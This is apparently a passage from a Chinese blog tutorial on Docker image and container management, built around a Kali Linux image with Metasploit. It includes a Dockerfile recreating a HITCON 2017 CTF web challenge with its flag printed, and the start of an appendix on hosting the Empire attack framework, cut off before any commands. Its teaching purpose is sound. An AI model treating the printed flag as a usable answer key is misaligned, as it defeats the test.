[OK]</span><br><span class="line">jasonchaffee/kali-linux        Kali Linux Docker Container with the kali-...   8                                       [OK]</span><br><span class="line">brimstone/kali                                                                 6                                       [OK]</span><br><span class="line">adamoss/kali2-metasploit       Kali2 Automated Build                           4                                       [OK]</span><br><span class="line">wsec/kali-metasploit           Official Kali Base image + Metasploit           3                                       [OK]</span><br><span class="line">kalinon/comicstreamer          ComicStreamer is a media server app <span class="keyword">for</span> sh...   3                                       [OK]</span><br></pre></td></tr></table></figure><h4 id="7-删除镜像"><a href="#7-删除镜像" class="headerlink" title="7.删除镜像"></a>7.删除镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#如果同一个标签有多个tag，那么docker rmi只是删除tag而已</span></span><br><span class="line"><span class="comment">#如果docker rmi id的话，会先删除所有的tag然后删除镜像</span></span><br><span class="line"><span class="comment">#但是若该镜像的容器存在，也是无法删除的，如果想强制删除可以使用docker rmi -f id</span></span><br><span class="line">➜  ~ docker images</span><br><span class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</span><br><span class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</span><br><span class="line">➜  ~ docker rmi kalilinux/kali-linux-docker:latest</span><br><span class="line">Untagged: kalilinux/kali-linux-docker:latest</span><br><span class="line">Untagged: kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d</span><br><span class="line">➜  ~ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><h4 id="8-创建镜像"><a href="#8-创建镜像" class="headerlink" title="8.创建镜像"></a>8.创建镜像</h4><p>1）基于已有镜像的容器创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们先创建容器并安装metasploit-framework</span></span><br><span class="line">➜  ~ docker run -it kalilinux:latest /bin/bash</span><br><span class="line">root@de573c5f5dc6:/<span class="comment"># apt update &amp;&amp; apt install metasploit-framework</span></span><br><span class="line">root@de573c5f5dc6:/<span class="comment">#exit</span></span><br><span class="line"><span class="comment">#记住id为de573c5f5dc6</span></span><br><span class="line"><span class="comment">#docker commit -m "改动信息" -a "作者名称" id REPOSITORY:TAG</span></span><br><span class="line">➜  ~ docker commit -m <span class="string">"install msf"</span> -a <span class="string">"zeroyu"</span> de573c5f5dc6 kalilinux:0.1</span><br><span class="line">sha256:66a6770d79d88c826b2e4a38b98037c14de0b9d2ce897307dc30afbf675ce51a</span><br><span class="line">➜  ~ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">kalilinux           0.1                 66a6770d79d8        21 seconds ago      2.54GB</span><br><span class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</span><br></pre></td></tr></table></figure><p>2）基于本地模板导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import ...</span><br></pre></td></tr></table></figure><h4 id="9-存出和载入镜像"><a href="#9-存出和载入镜像" class="headerlink" title="9.存出和载入镜像"></a>9.存出和载入镜像</h4><p>1）存出镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o docker_for_msf.tar kalilinux:0.1</span><br></pre></td></tr></table></figure><p>2）载入镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker load --input docker_for_msf.tar</span><br><span class="line"><span class="comment">#或则</span></span><br><span class="line">docker load &lt; docker_for_msf.tar</span><br></pre></td></tr></table></figure><h4 id="10-上传镜像"><a href="#10-上传镜像" class="headerlink" title="10.上传镜像"></a>10.上传镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push kalilinux:0.1</span><br></pre></td></tr></table></figure><h3 id="操作容器"><a href="#操作容器" class="headerlink" title="操作容器"></a>操作容器</h3><h4 id="1-创建容器"><a href="#1-创建容器" class="headerlink" title="1.创建容器"></a>1.创建容器</h4><p>1）新建容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker create新建的容器处于静止，可以使用docker start来启动它</span></span><br><span class="line"><span class="comment">#-i 保持标准输入打开   -t分配一个伪终端</span></span><br><span class="line">➜  ~ docker create -it kalilinux:0.1</span><br><span class="line">2bc48b88a424c8056fe9e6311848d5850c4e46008feec99ee095bc341ae9adaf</span><br><span class="line"><span class="comment">#查看处于终止状态的容器</span></span><br><span class="line">➜  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES</span><br><span class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 seconds ago       Created                                      frosty_poitras</span><br><span class="line">de573c5f5dc6        kalilinux:latest    <span class="string">"/bin/bash"</span>         5 hours ago         Exited (0) 5 hours ago                       happy_goldberg</span><br></pre></td></tr></table></figure><p>2）启动容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker start id 启动相应的容器</span></span><br><span class="line"><span class="comment">#docker ps 查看运行中的容器</span></span><br><span class="line">➜  ~ docker start 2bc48b88a424</span><br><span class="line">2bc48b88a424</span><br><span class="line">➜  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         9 minutes ago       Up 8 seconds                            frosty_poitras</span><br></pre></td></tr></table></figure><p>3）新建并启动容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#docker run = docker create + docker start</span></span><br><span class="line"><span class="comment">#run的过程：1.检查镜像是否存在，不存在就下载；2.用镜像创建容器；挂载可读写层；3.分配虚拟接口</span></span><br><span class="line"><span class="comment">#4.分配IP；5.运行指定程序；6.执行完自动终止</span></span><br><span class="line">➜  ~ docker run kalilinux:0.1 /bin/<span class="built_in">echo</span> <span class="string">'zeroyu'</span></span><br><span class="line">zeroyu</span><br><span class="line">➜  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES</span><br><span class="line">d6a6045c4f8b        kalilinux:0.1       <span class="string">"/bin/echo zeroyu"</span>   3 minutes ago       Exited (0) 3 minutes ago                       cocky_kirch</span><br><span class="line">➜  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="comment">#常用命令如下</span></span><br><span class="line">➜  ~ docker run -it kalilinux:0.1 /bin/bash</span><br><span class="line">root@2ed8aa5354f1:/<span class="comment"># ps</span></span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line">    1 pts/0    00:00:00 bash</span><br><span class="line">    7 pts/0    00:00:00 ps</span><br><span class="line">root@2ed8aa5354f1:/<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment">#退出后自动处于终止状态</span></span><br><span class="line">➜  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND              CREATED              STATUS                      PORTS               NAMES</span><br><span class="line">2ed8aa5354f1        kalilinux:0.1       <span class="string">"/bin/bash"</span>          About a minute ago   Exited (0) 48 seconds ago                       goofy_bardeen</span><br></pre></td></tr></table></figure><p>4）守护态运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在后台运行容器</span></span><br><span class="line">➜  ~ docker run -d kalilinux:0.1 /bin/sh -c <span class="string">"while true ; do echo zeroyu ; sleep 1 ; done"</span></span><br><span class="line">88f12c0725a466ba6d8f08f34fc8e9ac263ecafdff0a9e7282d7e9bb4073e6a0</span><br><span class="line">➜  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">88f12c0725a4        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   7 seconds ago       Up 7 seconds                            sleepy_kowalevski</span><br><span class="line">➜  ~ docker logs 88f12c0725a4</span><br><span class="line">zeroyu</span><br><span class="line">zeroyu</span><br><span class="line">zeroyu</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h4 id="2-终止容器"><a href="#2-终止容器" class="headerlink" title="2.终止容器"></a>2.终止容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#id为88f12c0725a4但是可以使用前几位来简单表示</span></span><br><span class="line">➜  ~ docker stop 88</span><br><span class="line">88</span><br><span class="line"><span class="comment">#查看所有处于终止态的id</span></span><br><span class="line">➜  ~ docker ps -qa</span><br><span class="line">073ff4e1dac7</span><br><span class="line"><span class="comment">#处于终止状态可以使用start来重新启动</span></span><br><span class="line">➜  ~ docker start 073</span><br><span class="line">073</span><br><span class="line">➜  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES</span><br><span class="line">073ff4e1dac7        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   About a minute ago   Up About a minute                       cranky_benz</span><br><span class="line"><span class="comment">#restart可以先终止再重新启动</span></span><br><span class="line">➜  ~ docker restart 073</span><br><span class="line">073</span><br></pre></td></tr></table></figure><h4 id="3-进入容器"><a href="#3-进入容器" class="headerlink" title="3.进入容器"></a>3.进入容器</h4><p>处于守护态（-d参数）的容器会在后台运行，但是你无法到信息，也无法进行操作。此时，要进入容器进行工作，要使用attach或者exec命令。</p><p>1）    使用attach命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#容器还可以使用name来唯一辨识</span></span><br><span class="line">➜  ~ docker run -itd kalilinux:0.1</span><br><span class="line">77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360</span><br><span class="line">➜  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         20 seconds ago      Up 21 seconds                           stupefied_gates</span><br><span class="line">➜  ~ docker attach stupefied_gates</span><br><span class="line">root@77e93d18a6a5:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2）使用exec命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                          PORTS               NAMES</span><br><span class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         5 minutes ago       Exited (0) About a minute ago                       stupefied_gates</span><br><span class="line">➜  ~ docker start 77e</span><br><span class="line">77e</span><br><span class="line">➜  ~ docker <span class="built_in">exec</span> -it 77e93d18a6a5 /bin/bash</span><br><span class="line">root@77e93d18a6a5:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="4-删除容器"><a href="#4-删除容器" class="headerlink" title="4.删除容器"></a>4.删除容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 minutes ago       Up About a minute                       stupefied_gates</span><br><span class="line">➜  ~ docker rm 77e93d18a6a5</span><br><span class="line">Error response from daemon: You cannot remove a running container 77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360. Stop the container before attempting removal or force remove</span><br><span class="line">➜  ~ docker stop 77e93d18a6a5</span><br><span class="line">77e93d18a6a5</span><br><span class="line">➜  ~ docker rm 77e93d18a6a5</span><br><span class="line">77e93d18a6a5</span><br></pre></td></tr></table></figure><h4 id="5-导入和导出容器"><a href="#5-导入和导出容器" class="headerlink" title="5.导入和导出容器"></a>5.导入和导出容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导出容器</span></span><br><span class="line"><span class="comment">#无论这个容器是否正在运行都是可以导出的</span></span><br><span class="line">➜  ~ docker <span class="built_in">export</span> -o test.tar 77e93d18a6a5</span><br><span class="line"><span class="comment">#或者执行</span></span><br><span class="line">➜  ~ docker <span class="built_in">export</span> 77e93d18a6a5 &gt; test.tar </span><br><span class="line"></span><br><span class="line"><span class="comment">#导入容器</span></span><br><span class="line">➜  ~ docker import test.tar - <span class="built_in">test</span>/kalilinux:v1.0</span><br></pre></td></tr></table></figure><h3 id="Docker数据管理"><a href="#Docker数据管理" class="headerlink" title="Docker数据管理"></a>Docker数据管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用-v标记挂在本地的tmp目录到容器中的/opt/tmp_test</span></span><br><span class="line"><span class="comment">#使用rw（默认也是这种方式）来指定可读写</span></span><br><span class="line"><span class="comment">#下面的#表示的不是注释</span></span><br><span class="line">➜  ~ docker run -it -P  --name db -v /tmp:/opt/tmp_test:rw kalilinux:0.1 /bin/sh</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bin  boot  devetc  home  liblib64  media  mnt  optproc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line"><span class="comment"># cd opt</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">tmp_test</span><br><span class="line"><span class="comment"># cd tmp_test</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">com.apple.launchd.0fGM76e6ao  com.apple.launchd.UWfVYRXkwo  powerlog</span><br><span class="line">com.apple.launchd.AkQGotnulN  pip-FfQw68-unpack    zeroyu.txt</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Docker端口映射"><a href="#Docker端口映射" class="headerlink" title="Docker端口映射"></a>Docker端口映射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-P是指映射到任意端口</span></span><br><span class="line"><span class="comment">#-p加端口号(本地端口:远程端口=&gt;0.0.0.0:8080:80)，则将端口映射到所有地址的相应端口</span></span><br><span class="line">➜  ~ docker run -it -d -p 5000:5000 kalilinux:v0.2</span><br><span class="line">23e91a40cb124720b1dba81371a275169124cbff2778120b4350470fa79a0d91</span><br><span class="line">➜  ~ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">23e91a40cb12        kalilinux:v0.2      <span class="string">"/bin/bash"</span>         12 seconds ago      Up 11 seconds       0.0.0.0:5000-&gt;5000/tcp   boring_volhard</span><br><span class="line">➜  ~ docker attach boring_volhard</span><br><span class="line">root@23e91a40cb12:/<span class="comment"># cd home/Empire/</span></span><br><span class="line">root@23e91a40cb12:/home/Empire<span class="comment"># ls</span></span><br><span class="line">LICENSE  README.md  changelog  data  empire  lib  setup</span><br><span class="line">root@23e91a40cb12:/home/Empire<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><h4 id="Dockerfile基本语句的说明"><a href="#Dockerfile基本语句的说明" class="headerlink" title="Dockerfile基本语句的说明"></a>Dockerfile基本语句的说明</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> &lt;image:版本标签&gt;：该 image 文件继承某个镜像 image，冒号表示标签，这里标签是<span class="number">8.4</span>，即<span class="number">8.4</span>版本的 node。</span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> &lt;name&gt; &lt;email&gt; :描述镜像的创建者，名称和邮箱</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> .[directory]：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的 directory 目录。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash">  源路径 目标路径 :将主机构建环境（上下文）目录中的文件和目录、以及一个URL标记的文件 拷贝到镜像中。与COPY相比ADD可以自动解压，也可以复制网络文件。路径不存在会自动创建。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> [directory]：指定接下来的工作路径为 directory。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> [cmd]：在/app目录下，运行[cmd]命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> [port]：将容器 port 端口暴露出来， 允许外部连接这个端口。在docker <span class="keyword">run</span><span class="bash"> -p的时候生效。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"path"</span>] : 在主机上创建一个挂载，挂载到容器的指定路径。docker run -v命令也能完成这个操作，而且更强大。这个命令不能指定主机的需要挂载到容器的文件夹路径。但docker run -v可以，而且其还可以挂载数据容器。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [cmd]：在容器启动后自动执行 [cmd] 命令(只会出现一次)</span></span><br><span class="line"></span><br><span class="line">EVN &lt;key&gt; &lt;value&gt; : 只能设置一个，设置容器的环境变量，可以让其后面的<span class="keyword">RUN</span><span class="bash">命令使用，容器运行的时候这个变量也会保留。</span></span><br></pre></td></tr></table></figure><h4 id="CTF中的Dockerfile实例展示"><a href="#CTF中的Dockerfile实例展示" class="headerlink" title="CTF中的Dockerfile实例展示"></a>CTF中的Dockerfile实例展示</h4><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Hitcon 2017 web baby^h-master-php-2017</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#read_secret输出OrangeOrangeOrange</span></span><br><span class="line"><span class="comment">#MaxConnectionsPerChild为100</span></span><br><span class="line"><span class="comment">#其余环境与题目大致无异</span></span><br><span class="line"><span class="comment">#如要修改root与题目用户密码请用 [docker exec -it '你的应用名称' /bin/bash] 进入容器修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#整合 apache php7</span></span><br><span class="line"><span class="keyword">FROM</span> pr0ph3t/lap7</span><br><span class="line"><span class="keyword">MAINTAINER</span> Pr0ph3t &lt;<span class="number">1415314884</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Install crontab and perl with LWP</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update -y &amp;&amp; apt-get install cron -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Init crontab , 每天凌晨4点清空data文件夹</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'0 4 * * * root rm -rf /var/www/data/*'</span> &gt;&gt; /etc/crontab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Init challenge</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> readflag /read_flag</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> read_secret /read_secret</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> avatar-1.gif /var/www/html/avatar.gif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod u+s /read_flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf /var/www/html/index.html</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /var/www/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chown www-data /var/www/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod -R 775 /var/www/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'hitcon&#123;Th3 d4rk fl4m3 PHP Mast3r&#125;'</span> &gt; /flag</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 700 /flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Configure the apache2</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">'s/Indexes //'</span> /etc/apache2/apache2.conf &gt; /etc/apache2/apache2.conf.new</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">'s/MaxConnectionsPerChild   0/MaxConnectionsPerChild   100/'</span> /etc/apache2/mods-available/mpm_prefork.conf &gt; /etc/apache2/mods-available/mpm_prefork.conf.new</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv /etc/apache2/apache2.conf.new /etc/apache2/apache2.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv /etc/apache2/mods-available/mpm_prefork.conf.new /etc/apache2/mods-available/mpm_prefork.conf</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'&lt;Directory "/var/www/data"&gt;\n\tphp_flag engine off\n&lt;/Directory&gt;'</span> &gt;&gt; /etc/apache2/sites-enabled/000-default.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Create run.sh</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> run.sh /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /run.sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Expose http service</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"bash -x /run.sh"</span>]</span></span><br></pre></td></tr></table></figure><h4 id="Dockerfile的使用方式"><a href="#Dockerfile的使用方式" class="headerlink" title="Dockerfile的使用方式"></a>Dockerfile的使用方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进入Dockerfile目录</span><br><span class="line">[docker build -t &apos;自定义镜像名字&apos; . ] //最后的.别少了</span><br><span class="line">[docker run -id --name &apos;你的应用名称&apos; -p 外部端口:80 -m &apos;内存限制 如1g、500m&apos; &apos;你的自定义镜像名称&apos; /run.sh]</span><br></pre></td></tr></table></figure><h3 id="附例"><a href="#附例" class="headerlink" title="附例"></a>附例</h3><p>在vps中的docker上使用empire进行渗透测试(metasploit同理)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 